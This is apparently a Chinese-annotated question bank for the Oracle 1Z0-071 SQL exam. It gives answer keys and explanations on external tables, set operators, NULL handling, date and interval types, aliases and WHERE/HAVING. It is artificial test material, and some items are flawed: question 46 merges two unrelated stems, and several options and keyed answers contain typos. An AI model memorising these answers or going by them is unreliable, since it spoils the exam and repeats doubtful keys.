Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about external tables? A. Indexes can be created on them. B. You can populate them from existing data in the database by using the CREATE TABLE AS SELECT command. C. DML statements cannot be used on them. D. Their data can be retrieved by using only SQL or PL/SQL. E. Their metadata and actual data are both stored outside the database. Correct Answer: BC Explanation/Reference: 考点：外部表分析：BC A 错外部表没有分配空间建索引 B 对通过子查询外部表建表 C 对不能 DML外部表 D 错有其他软件，如操作系统 E 错元数据在数据库，实际数据在外部 QUESTION 23 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the BOOK_TRANSACTION table: Examine this partial SQL statement: SELECT * FROM books_transactions Which two WHERE conditions give the same result? A. WHERE borrowed_date = SYSDATE AND (transaction_type =’RM’ OR member_id IN (’A101’ ,’A102’)); B. WHERE borrowed_date = SYSDATE AND transaction_type =’RM’ OR member_id IN (’A101’ ,’A102’) C. WHERE borrowed_date = SYSDATE AND (transaction_type =’RM’ AND (member _id = ’A101’ OR member _id = ’A102’)); D. WHERE (borrowed_date = SYSDATE AND transaction_type =’RM’) OR member _id IN (’A101’ ,’A102’); E. WHERE borrowed_date = SYSDATE AND (transaction_type =’RM’ AND member _id = ’A101’ OR member _id = ’A102’); Correct Answer: BD Explanation/Reference: 考点：where子句 QUESTION 24 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the rules of precedence for operators? A. Multiple parentheses can be used to override the default precedence of operators in an expression. B. Arithmetic operators with equal precedence are evaluated from left to right within an expression. C. The concatenation operator ||is always evaluated before addition and subtraction in an expression. D. NULLS influence the precedence of operators in an expression. E. The + binary operator has the highest precedence in an expression in a SQL statement. Correct Answer: AB Explanation/Reference: 考点：运算符关于运算符的优先规则，哪两个陈述是正确的? A 对括号昀优先 B 对同优先级从左到右 C 错优先级：四则运算排第一，连接运算符 ||排第二 D 错 is（not） null 会影响优先级。Nulls 数据不影响 E 错二进制文件是非结构化，不能直接运算。 QUESTION 25 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three action can you perform by using the ORACLE_DATAPUMP access driver? A. Create a directory object for a flat file. B. Query data from an external table. C. Read data from an external table and load it into a table in the database. D. Execute DML statements on an external table. E. Create a directory object for an external table. F. Read data from a table in the database and insert it into an external table. Correct Answer: BCE Explanation/Reference: 考点：ORACLE_DATAPUMP A错误 Create a directory object for a flat file. B正确 Query data from an external table. SQL&gt; CREATE TABLE inventories_xt 2 ORGANIZATION EXTERNAL 3 ( 4 TYPE ORACLE_DATAPUMP 5 DEFAULT DIRECTORY def_dir1 6 LOCATION (&apos;inv_xt.dmp&apos;) 7 ) 8 AS SELECT * FROM inventories; Table created. Now that the external table is created, it can be queried just like any other table. For example, select the count of records in the external table, as follows: SQL&gt; SELECT COUNT(*) FROM inventories_xt; COUNT(*) C 正确 Read data from an external table and load it into a table in the database.可以通过外部表查询数据，还可以通过加载/导入数据到表中 D 错误 Execute DML statements on an external table. 外部表不支持DML， E 正确 Create a directory object for an external table. 需要创建目录对象 F 错误 Read data from a table in the database and insert it into an external table. 外部表不能DML QUESTION 26 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the MEMBERS table: SELECT city,last_name LNAME FROM members ...; You want to display all cities that contain the string AN.The cities must be returned in ascending order,with the last names further sorted in descending order. Which two clauses must you add to the query? A. ORDER BY 1,2 B. ORDER BY last_name DESC, city ASC C. ORADER BY 1,LNAME DESC D. WHERE city=‘%AN%’ E. WHERE city LIKE ‘%AN%’ F. WHERE city IN (‘%AN%’) Correct Answer: CE Explanation/Reference: 分析：CE包含 AN 的城市名，用 like City是第一列升序（默认值），last_names 降序用 desc QUESTION 27 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 For customers whose income level has a value,you want to display the first name and due amount as 5% of their credit limit. Customers whose due amount is null should not be displayed. Which query should be used? A. SELECT cust_first_name, cust_credit_limit *.05 AS DUE_AMOUNT FROM customers WHERE cust_income_level !=NULL AND cust_credit_leve !=NULL; B. SELECT cust_first_name,cust_credit _limit*.05 AS DUE_AMONT FROM customers WHERE cust_income_level &lt;&gt;NULL AND due_amount &lt;&gt;NULL; C. SELECT cust_first_name,cust_credit_limit *.05 AS DUE_AMONT FROM customers WHERE cust_income_level IS NOT NULL AND cust_credit_limit IS NOT NULL; D. SELECT cust_first_name,cust_credit _limit*.05 AS DUE_AMONT FROM customers WHERE cust_income_level IS NOT NULL AND due_amount IS NOT NULL; E. SELECT cust_first_name,cust_credit _limit*.05 AS DUE_AMONT FROM customers WHERE cust_income_level != NULL AND due_amount != NULL; Correct Answer: C Explanation/Reference: 判断是否为NULL的语法为：is null 或者 is not null QUESTION 28 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the PRODUCT_STATUS table: The STATUS column contains the values &apos;IN stock&apos; or &apos;OUT OF STOCK&apos; for each row. Which two queries will execute successfully? A. SELECT prod_id || q&apos;(&apos;s not available)&apos; &quot;CURRENT AVAILABILITY&quot; FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; B. SELECT prod_id q&apos;s not available&quot; FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; C. SELECT prod_id || q&apos;(&apos;s not available)&apos; ‘CURRENT AVAILABILITY’ FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; D. SELECT prod_id || q&apos;(&apos;s not available)&apos; FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; E. SELECT prod_id q&quot;&apos;s not available&quot; FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; F. SELECT prod_id &quot;CURRENT AVAILABILITY&quot; || q&apos;(&apos;s not available)&apos; FROM product_status WHERE status = &apos;OUT OF STOCK&apos;; Correct Answer: AD Explanation/Reference: 知识点： 代替引用符（q） 语法： q&apos;引用符 ... 引用符&apos; 1. 任意单字节和多字节字符集 2. [ ], { },( ) ,&lt;&gt;各种组合。 3.此处可以是大写 Q，和小写q 此处 =作为引用符 C错 Oracle的别名，不可以使用单引号 QUESTION 29 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the PROMOTIONS table: You want to display the unique promotion costs in each promotion category. Which two queries can be used? A. SELECT DISTINCT promo_category, promo_cost FROM promotions ORDER BY 1; B. SELECT promo_cost, promo_category FROM promotions ORDER BY 1; C. SELECT promo_category, DISTINCT promo_cost FROM promotiong ORDER BY 2; D. SELECT DISTINCT promo_category || &apos;has&apos; || promo_cost As COSTS FROM promotions ORDER BY 1; E. SELECT DISTINCT promo_cost ||&apos;in&apos;|| DISTINCT promo_category promotions ORDER BY 1； Correct Answer: AD Explanation/Reference: 分析：AD问唯一 promotion costs(distinct)，在 promotion category 范围里面（order by） A对 distinct 列，列 B 错没有去重 C 错 distinct 一定要放在开头 D 对 distinct 列，列 E 错 distinct 一定要放在开头 QUESTION 30 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the structure of two tables: create table products (prod_id char(2), prod_name char(4), exp_date timestamp(6)); create table new_products (prod_id char(4), prod_name varchar2(10), exp_date date); Which two queries execute successfully? A. SELECT prod_id, prod_name FROM products INTERSECT SELECT 100, prod_name FROM new_products; B. SELECT * FROM products MINUS SELECT prod_id FROM new_products; C. SELECT * FROM products UNION SELECT * FROM new_products; D. SELECT prod_id, exp_date FROM products UNION ALL SELECT prod_id, NULL FROM new_products; E. SELECT prod_id FROM products UNION ALL SELECT prod_id, prod_name FROM new_products; Correct Answer: CD Explanation/Reference: 考点：集合操作，要求列数和数据类型都要一致； QUESTION 31 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this statement: SELECT 1 AS id, &apos;John&apos; AS first_name, NULL AS commission FROM dual INTERSECT SELECT 1, &apos;John&apos;, null FROM dual ORDER BY 3; What is returned upon execution? A. 2 rows B. 0 rows C. An error D. 1row Correct Answer: D Explanation/Reference: 分析：D D 对虚拟表单行单列 intersect 交集 QUESTION 32 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the TRANSACTIONS table: Which two SQL statements execute successfully? A. SELECT customer_id AS ‘CUSTOMER-ID’, transaction_date AS DATE, amount + 100 ‘DUES’ FROM transactions; B. SELECT customer_id CUSTID, transaction_date TRANS_DATE, amount + 100 DUES FROM transactions; C. SELECT customer_id AS “CUSTOMER-ID”, transaction_date as “DATE”, amount + 100 DUES FROM transactions; D. SELECT customer_id AS CUSTOMER-ID, transaction_date TRANS_DATE, amount + 100 “DUES AMOUNT” FROM transactions; E. SELECT customer_id AS “CUSTOMER-ID”, transaction_date as DATE, amount + 100 “DUES” FROM transactions; Correct Answer: BC Explanation/Reference: 分析：BC A 错 date 是关键字要加双引号 D 错 CUSTOMER-ID 有运算符，要加双引号 E 错 date 是关键字要加双引号 QUESTION 33 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about Structured Query language (SQL)? A. It best supports relational databases. B. It requires that data be contained in hierarchical data storage C. It guarantees atomicity, consistency, isolation, and durability (ACID) features. D. It is the only language that can be used for both relational and object-oriented databases E. It is used to define encapsulation and polymorphism for a relational table F. It provides independence for logical data structures being manipulated from the underlying physical data storage Correct Answer: ABF Explanation/Reference: 关于结构化查询语言(SQL)，哪三个陈述是正确的? C 错，ACID 不是sql引擎提供的，而是存储引擎提供的 D 错，SQL语言不是唯一用于关系数据库和面向对象数据库的语言，还有 PL/SQL E 错，JAVA才是用于定义关系表的封装和多态性的语言，不是SQL。 QUESTION 34 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about time zones, date data types, and timestamp data types in an Oracle database? A. The DBTIMEZONE function can return an offset from Universal Coordinated Time (UTC). B. A TIMESTAMP data type column contains information about year, month, and day. C. A TIMESTAMP WITH LOCAL TIMEZONE data type column is stored in the database using the time zone of the session that inserted the row. D. The SESSIONTIMEZONE function can return an offset from Universal Coordinated Time (UTC). E. The CURRENT_TIMESTAMP function returns data without time zone information. Correct Answer: ABD Explanation/Reference: 在Oracle数据库中关于时区、日期数据类型和时间戳数据类型，哪三个陈述是正确的？ 本题用排除法来做。排除C和D The DBTIMEZONE function can return an offset from Universal Coordinated Time (UTC). DBTIMEZONE函数可以从通用协调时间(UTC)返回偏移量。 A TIMESTAMP data type column contains information about year, month, and day. 时间戳数据类型列包含关于年、月和日的信息。 A TIMESTAMP WITH LOCAL TIMEZONE data type column is stored in the database using the time zone of the session that inserted the row. 带有本地时区数据类型列的时间戳使用时间存储在数据库中插入该行的会话的区域。错误，在用户提交时间给数据库的时，该类型会转换成数据库的时区来保存数据，即数据库保存的时间是数据库本地时区，当别的用户访问数据库时 oracle会自动将该时间转换成当前客户端的时间。例子： 1、创建表 CREATE TABLE TIMESTAMP_TEST( TIME DATE, TIMESTP TIMESTAMP(3), TIMESTP_TZ TIMESTAMP(3) WITH TIME ZONE, TIMESTP_LTZ TIMESTAMP(3) WITH LOCAL TIME ZONE) 2、添加数据 INSERT INTO TIMESTAMP_TEST VALUES(SYSDATE,SYSDATE,SYSDATE,SYSDATE); commit; 3、查询dbtimezone和sessiontimezone的值 select dbtimezone ,sessiontimezone from dual; DBTIME SESSIONTIMEZONE +00:00 +08:00 4、查看数据的值 SQL&gt; SELECT * FROM TIMESTAMP_TEST; TIME TIMESTP TIMESTP_TZ TIMESTP_LTZ 02-6月 -10 02-6月 -10 11.21.10.000 上午 02-6月 -10 11.21.10.000 上午 +08:00 02-6月 -10 11.21.10.000 上午 5、修改会话的time_zone值 alter session set time_zone=&apos;+10:00&apos;; 6、查看结果 SQL&gt; SELECT * FROM TIMESTAMP_TEST; TIME TIMESTP TIMESTP_TZ TIMESTP_LTZ 02-6月 -10 02-6月 -10 11.21.10.000 上午 02-6月 -10 11.21.10.000 上午 +08:00 02-6月 -10 01.21.10.000 下午 7、从上面的实验可以看出二者的去区别，当session的时区由8变为10是，时间增加两个小时再向表中添加一条记录 insert into TIMESTAMP_TEST values( TO_TIMESTAMP_TZ(&apos;2010-12-01 23:12:56.788 -12:44&apos;, &apos;YYYY-MM-DD HH24:MI:SS.FF TZH:TZM&apos;), TO_TIMESTAMP_TZ(&apos;2010-12-01 23:12:56.788-12:44&apos;, &apos;YYYY-MM-DD HH24:MI:SS.FF TZH:TZM&apos;), TO_TIMESTAMP_TZ(&apos;2010-12-01 23:12:56.788 -12:44&apos;, &apos;YYYY-MM-DD HH24:MI:SS.FF TZH:TZM&apos;), TO_TIMESTAMP_TZ(&apos;2010-12-0123:12:56.788 -12:44&apos;, &apos;YYYY-MM-DD HH24:MI:SS.FF TZH:TZM&apos;)); （tzh：时区中的小时，tzm:时区中的分） 在这里我指定了数据添加时的时区为-12:44，查询结果为 TIME TIMESTP TIMESTP_TZ TIMESTP_LTZ 01-12月-10 01-12月-10 11.12.56.788 下午 01-12月-10 11.12.56.788 下午 -12:44 02-12月-10 09.56.56.788 下午 TIME TIMESTP TIMESTP_TZ TIMESTP_LTZ 02-6月 -10 02-6月 -10 11.21.10.000 上午 02-6月 -10 11.21.10.000 上午 +08:00 02-6月 -10 01.21.10.000 下午由于当前用户的时区是+10：00，添加数据时的指定时区死-12:44，二者时间相差22小时44分 The SESSIONTIMEZONE function can return an offset from Universal Coordinated Time (UTC). SESSIONTIMEZONE函数可以返回一个来自协调世界时(UTC)的偏移量。 The CURRENT_TIMESTAMP function returns data without time zone information. CURRENT_TIMESTAMP函数返回没有时区信息的数据。错误，带当前时区 QUESTION 35 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the CUSTMERS table: You want to display details of all customers who reside in cities starting with the letter D followed by at least two characters. Which query can be used? A. SELECT * FROM customers WHERE city = ‘D_%’; B. SELECT * FROM customers WHERE city = ‘%D_’; C. SELECT * FROM customers WHERE city like ‘D_%’; D. SELECT * FROM customers WHERE city like ‘D_’; Correct Answer: C Explanation/Reference: 您希望显示所有居住在城市的客户的详细信息，以字母 D 开头，后面至少有两个字符。 以字母 D 开头 like’D’ 至少%(0 个或多个字符) 有两个字符 D _ QUESTION 36 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two are true about a SQL statement using SET operators such as UNION? A. The data type of each column returned by the second query must be implicitly convertible to the data type of the corresponding column returned by the first query. B. The data type of each column returned by the second query must exactly match the data type of the corresponding column returned by the first query. C. The number, but not names, of columns must be identical for all SELECT statements in the query. D. The data type group of each column returned by the second query must match the data type group of the corresponding column returned by the first query. E. The names and numbers of columns must be identical for all SELECT statements in the query. Correct Answer: CD Explanation/Reference: A 错类型要一样不能转换 B 错 must ，字符长度可以不同 C 对列数量一致 D 对类型一致 E 错列名不需要相同 QUESTION 37 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about INTERVAL data types? A. INTERVAL YEAR TO MONTH columns only support monthly intervals within a range of years. B. The value in an INTERVAL DAY TO SECOND column can be copied into an INTERVAL YEAR TO MONTH column. C. INTERVAL YEAR TO MONTH columns only support monthly intervals within a single year D. The YEAR field in INTERVAL YEAR TO MONTH column must be a positive value E. INTERVAL DAY TO SECOND COLUMNS support fractions of seconds. F. INTERVAL YEAR TO MONTH columns support yearly intervals. Correct Answer: EF Explanation/Reference: 分析：EF A 错还支持 day B 错 day 格式不一样 C 错 only D 错支持余数 1-1 一年零一个月 E 对秒数精确到小数点 F 对默认支持年 QUESTION 38 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about date/time functions in a session where NLS_DATE_FORMAT is set to DD-MON-YYYY HH24:MI:SS A. SYSDATE can be used in expressions only if the default date format is op-Mon-RR. B. CURRENT_TIMESTAMP returns the same date as CURRENT_DATE. C. CURRENT DATE returns the current date and time as per the session time zone. D. SYSDATE and CURRENT DATE return the current date and time set for the operating system of the database server. E. CURRENT_TIMESTAMP returns the same date and time as SYSDATE with additional details of fractional seconds. F. SYSDATE can be queried only from the DUAL table. Correct Answer: BC Explanation/Reference: current_date 返回的是当前会话时间,而 sysdate 返回的是服务器时间 A 错可以转换 B 对同一个时间，显示方式不一样 C 对有时区 D 错两者有区别 E 错两者有区别 F 错 only alter session set nls_date_format=&apos;DD-MON-YYYY HH24:MI:SS&apos;; select CURRENT_TIMESTAMP,current_date from dual; QUESTION 39 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You have been tasked to create a table for a banking application. One of the columns must meet three requirements: 1) Be stored in a format supporting date arithmetic without using conversion functions 2) Store a loan period of up to 10 years 3) Be used for calculating interest for the number of days the loan remains unpaid Which data type should you use? A. TIMESTAMP WITH TIMEZONE B. TIMESTAMP C. TIMESTAMP WITH LOCAL TIMEZONE D. INTERVAT YEAR TO MONTH E. INTERVAL DAY TO SECOND Correct Answer: E Explanation/Reference: 1 ）以支持日期算法的格式存储，而不使用转换函数 2）存放昀长 10年的贷款期限 3 ）用于计算贷款未付天数的利息分析：E ABC 错 timestamp 不能计算时间间隔 D 错条件 3，需要计算贷款天数。 https://blog.csdn.net/tianzengyan/article/details/5604692 QUESTION 40 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The SALES table has columns PROD_ID and QUANTITY _SOLD of data type NUMBER. Which two queries execute successfully? A. SELECT COUNT (prod_id) FROM sales WHERE| QUANTITY _SOLD &gt; 55000 GROUP By prod_id; B. SELECT prod_id FROM SALES WHERE QUANTITY _SOLD &gt; 55000 GROUP BY prod_id HAVTNG COUNT (*) &gt; 10; C. SELECT COUNT (prod_id) FROM sales GROUP BY prod_id WHERE quantity_SOLD &gt; 55000 D. SELECT prod_id FROM SALES WHERE QUANTITY _SOLD &gt; 55000 AND COUNT (*)&gt;10 GROUP BY COUNT (*)&gt;10 E. SELECT prod_id FROM SALES WHERE QUANTITY _SOLD &gt; 55000 AND COUNT (*)&gt;10 GROUP BY prod_id HAVTNG COUNT (*)&gt;10 Correct Answer: AB Explanation/Reference:C 错 where 需放在 group by 前 D 错聚合函数用 having 代替 where E 错 group by 的列不是全部， count（*）是全部 QUESTION 41 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the results of using the intersect operator in compound queries? A. Reversing the order of the intersected tables can sometimes affect the output, B. Column names in each select in the compound query can be different C. INTERSECT returns rows common to both sides of the compound query. D. The number of columns in each select in the compound query can be different E. INTERSECT ignores NULLs. Correct Answer: BC Explanation/Reference: 分析：BC A 错B 对只需要类型和列数量一致 C 对显示公共的行 D 错类型和列数量一致 E 错包含一个空值 考点：intersect:返回查询结果中相同的部分（交集）。 QUESTION 42 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this SQL statement: SELECT cust_id, cust_last name &quot;Last Name&quot; FROM customers WHERE country_id=10 UNION SELECT cust _id CUST_No, cust_last_name FROM customers WHERE country_id=30 Identify three ORDER BY clauses,any one of which can complete the query successfully. A. ORDER BY 2, 1 B. ORDER BY &quot;CUST_NO&quot; C. ORDER BY 2, cust_id D. ORDER BY CUST_NO E. ORDER BY &quot;Last Name&quot; Correct Answer: ACE Explanation/Reference:联合查询排序第一个 select 可以用列号 SELECT 1 cust_id, &apos;a&apos; &quot;Last Name&quot; FROM dual UNION SELECT 2 CUST_No, &apos;b&apos; cust_last_name FROM dual; SELECT 1 cust_id, &apos;a&apos; &quot;Last Name&quot; FROM dual UNION SELECT 2 CUST_No, &apos;b&apos; cust_last_name FROM dual order by 2,1; SELECT 1 cust_id, &apos;a&apos; &quot;Last Name&quot; FROM dual UNION SELECT 2 CUST_No, &apos;b&apos; cust_last_name FROM dual order by cust_id,&quot;Last Name&quot;; QUESTION 43 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the DUAL table? A. It can display multiple rows and columns. B. It can be accessed only by the sys user. C. It can be accessed by any user who has the SELECT privilege in any schema D. It can display multiple rows but only a single column. E. It consists of a single row and single column of VARCHAR2 data type. F. It can be used to display only constants or pseudo columns. Correct Answer: CE Explanation/Reference: 分析：CE C 对用户需要权限 select any schema E 对单行单列 QUESTION 44 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the WHERE and HAVING clauses in a SELECT statement? A. The WHERE clause can be used to exclude rows after dividing them into groups B. WHERE and HAVING clauses can be used in the same statement only if applied to different table columns. C. The HAVING clause can be used with aggregating functions in subqueries D. Aggregating functions and columns used in HAVING clauses must be specified in the SELECT list of a query E. The WHERE clause can be used to exclude rows before dividing them into groups. Correct Answer: CE Explanation/Reference: 关于SELECT语句中的WHERE和HAVING子句，哪两个语句是正确的? A) The WHERE clause can be used to exclude rows after dividing them into groups 错误 where在group 之前 B) WHERE and HAVING clauses can be used in the same statement only if applied to different table columns. 错误，一个在group前，having在group 后。 C) The HAVING clause can be used with aggregating functions in subqueries 正确 D) Aggregating functions and columns used in HAVING clauses must be specified in the SELECT list of a query 错误，可以没有having过滤 E) The WHERE clause can be used to exclude rows before dividing them into groups. 正确 A) WHERE子句可用于将行划分为组后排除行 B) 只有应用于不同的表列时，WHERE和HAVING子句才能在同一语句中使用。 C) HAVING子句可以与子查询中的聚合函数一起使用 D)必须在查询的 SELECT列表中指定用于HAVING子句的聚合函数和列 E) WHERE子句可用于在将行划分为组之前排除行。 QUESTION 45 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this partial command: Which two clauses are required for this command to execute successfully? A. The DEFAULT DIRECTORY Clause B. The REJECT LIMIT Clause C. The LOCATION clause D. The ACCESS PARAMETERS clause E. The access driver TYPE clause Correct Answer: AC Explanation/Reference: 考点：外部表 organization external 语法 https://docs.oracle.com/en/database/oracle/oracle-database/12.2/sqlrf/index.html https://docs.oracle.com/en/database/oracle/oracle-database/12.2/sqlrf/CREATE-TABLE.html#GUID-F9CE0CC3-13AE-4744-A43C-EAC7A71AAAB6 https://docs.oracle.com/en/database/oracle/oracle-database/12.2/sutil/oracle-external-tables.html#GUID-038ED956-A6EE-4C6D-B7C9-0D406B8088B6 要成功执行此命令，需要哪两个子句? TYPE—指定外部表的类型。每种类型的外部表均由其自己的访问驱动程序支持。 DEFAULT DIRECTORY—指定用于所有未明确命名目录对象的输入和输出文件的默认目录。该位置是通过目录对象而不是目录路径指定的。创建外部表之前，必须先创建目录对象。否则，将产生错误 The ACCESS PARAMETERS clause 可选 LOCATION —指定外部表的数据文件 这两个参数是必须的，例如 events_all.csv Winter Games,10-JAN-2010,10, Hockey Tournament,18-MAR-2009,3, Baseball Expo,28-APR-2009,2, International Football Meeting,2-MAY-2009,14, Track and Field Finale,12-MAY-2010,3, Mid-summer Swim Meet,5-JUL-2010,4, Rugby Kickoff,28-SEP-2009,6, CREATE TABLE EVENTS_XT_1 (EVENT varchar2(30), START_DATE date, LENGTH number) ORGANIZATION EXTERNAL (default directory booboo_dir location (&apos;events_all.csv&apos;)); QUESTION 46 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about Oracle synonyms? Which three queries use valid expressions? A. SELECT product_id, unit_price, 5 &quot;Discount&quot;, unit_price + surcharge - discount from products B. SELECT product_id, (unit_price*0.15 / (4.75 +552.25) ) from products. C. SELECT product_id, (expiry_date - delivery_date)*2 from products. D. SELECT product_id, expiry_date *2 from products. E. SELECT product_id, unit_price, unit_price + surcharge from products F. SELECT product_id, unit_price, unit_price || 5 &quot;Discount&quot;, unit_price + surcharge - discount from products Correct Answer: BCE Explanation/Reference: 测试： create table products (product_id number(2) not null,product_name varchar2(10),unit_price number(3),surcharge varchar2(2),expiry_date date,delivery_date date); insert into products values (1,&apos;apple&apos;,10,&apos;2&apos;,sysdate,sysdate); commit; 查看当前表中的数据： SCOTT@testdb&gt;select * from products; PRODUCT_ID PRODUCT_NA UNIT_PRICE SU EXPIRY_DA DELIVERY_ 1 apple 10 2 14-JAN-20 14-JAN-20 SELECT product_id, unit_price, 5 &quot;Discount&quot;, unit_price + surcharge - discount from products; 错误别名列不能直接使用，如果要使用应该写成子查询。 SELECT product_id, (unit_price*0.15 / (4.75 +552.25) ) from products; 正确 SELECT product_id, (expiry_date - delivery_date)*2 from products; 正确 SELECT product_id, expiry_date *2 from products;错误，数据类型为日期date 不能做乘法 SELECT product_id, unit_price, unit_price + surcharge from products;正确，unit_price 和 surcharge number 和 varchar2 可以进行运算 SELECT product_id, unit_price, unit_price || 5 &quot;Discount&quot;, unit_price + surcharge - discount from products; 错误，别名列不能直接使用，如果要使用应该写成子查询。 Exam K 